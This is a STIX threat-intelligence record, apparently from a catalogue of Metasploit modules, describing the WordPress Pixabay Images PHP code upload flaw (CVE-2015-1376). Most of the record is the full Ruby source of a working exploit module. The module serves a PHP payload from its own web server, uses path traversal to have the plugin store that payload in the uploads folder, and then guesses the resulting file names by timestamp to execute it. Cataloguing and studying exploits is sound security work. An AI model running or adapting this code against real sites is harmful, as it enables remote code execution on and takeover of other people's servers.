{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ef3d422a-cf38-4b49-80b8-9b257d58d556",
    "created": "2024-08-14T17:13:38.968337Z",
    "modified": "2024-08-14T17:13:38.968342Z",
    "name": "WordPress Pixabay Images PHP Code Upload",
    "description": " This module exploits multiple vulnerabilities in the WordPress plugin Pixabay",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_pixabay_images_upload.rb",
            "external_id": "wp_pixabay_images_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1376"
        },
        {
            "source_name": "reference",
            "url": "https://www.mogwaisecurity.de/advisories/MSA-2015-01.txt"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7758"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  Rank = ExcellentRanking\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WordPress Pixabay Images PHP Code Upload',\n      'Description'    => %q{\n        This module exploits multiple vulnerabilities in the WordPress plugin Pixabay\n        Images 2.3.6. The plugin does not check the host of a provided download URL\n        which can be used to store and execute malicious PHP code on the system.\n      },\n      'Author'\t=>\n        [\n          'h0ng10', # Discovery, Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2015-1376'],\n          ['URL', 'https://www.mogwaisecurity.de/advisories/MSA-2015-01.txt'],\n          ['OSVDB', '117145'],\n          ['OSVDB', '117146'],\n          ['WPVDB', '7758']\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['pixabay-images 2.3', {}]],\n      'DefaultTarget'  => 0,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n        },\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'DisclosureDate' => '2015-01-19'\n    ))\n\n    register_options(\n      [\n        OptInt.new('TRIES', [true, 'Number of guesses if initial name guess fails', 5]),\n        OptInt.new('DEPTH', [true, 'Traversal path until the uploads folder', 4])\n      ])\n  end\n\n\n  # Handle incoming requests from the server\n  def on_request_uri(cli, request)\n      print_status(\"URI requested: #{request.raw_uri}\")\n      send_response(cli, payload.encoded)\n  end\n\n  # Create a custom URI\n  def generate_payload_uri\n      \"#{get_uri}.php\"\n  end\n\n  def autofilter\n    true\n  end\n\n  def call_payload(file_name)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(wordpress_url_wp_content, 'uploads', file_name)\n    }, 3)\n\n    res\n  end\n\n  def exploit\n    unless wordpress_and_online?\n      fail_with(Failure::NoTarget, \"#{peer} - #{target_uri} does not seeem to be WordPress site\")\n    end\n\n    print_status(\"Starting up web service...\")\n    start_service\n\n    begin\n      payload_uri = generate_payload_uri\n      vprint_status(\"Using URI #{payload_uri}\")\n\n      random_file_name = rand_text_alphanumeric(rand(5) + 5)\n      post = {\n        'pixabay_upload' => rand_text_alphanumeric(rand(5) + 5),\n        'image_url' => payload_uri,\n        'image_user' => rand_text_alphanumeric(rand(5) + 5),\n        'q' => \"#{'../' * datastore['DEPTH']}#{random_file_name}\"\n      }\n\n      print_status(\"Uploading payload #{random_file_name}...\")\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(wordpress_url_backend),\n        'vars_post' => post\n      })\n\n    ensure\n      cleanup_service\n    end\n\n    unless res && res.code == 200 && res.headers['date']\n      fail_with(Failure::Unknown, \"#{peer} - Upload failed or unable to guess the system time...\")\n    end\n\n    server_epoch_time = DateTime.strptime(res.headers['date'], '%a, %d %b %Y %H:%M:%S GMT').to_i\n\n    print_status(\"Calling payload...\")\n    datastore['TRIES'].times do |i|\n      payload_name = \"#{random_file_name}_#{server_epoch_time + i}.php\"\n      res = call_payload(payload_name)\n      if (res && res.code == 200) || session_created?\n        register_files_for_cleanup(payload_name)\n        break\n      end\n    end\n  end\n\n  def check\n    res = wordpress_and_online?\n    unless res\n      vprint_error(\"It doesn't look like a WordPress site\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    # Send a request with a illegal URL to verify that the target is vulnerable\n    post = {\n      'pixabay_upload' => rand_text_alphanumeric(rand(5) + 5),\n      'image_url' => rand_text_alphanumeric(rand(5) + 5),\n      'image_user' => rand_text_alphanumeric(rand(5) + 5),\n      'q' => rand_text_alphanumeric(rand(5) + 5)\n    }\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(wordpress_url_backend),\n      'vars_post' => post\n    })\n\n    if res && res.body && res.body.to_s =~ /Error: A valid URL was not provided/\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2015-01-19",
    "x_mitre_platforms": [
        "['php']"
    ]
}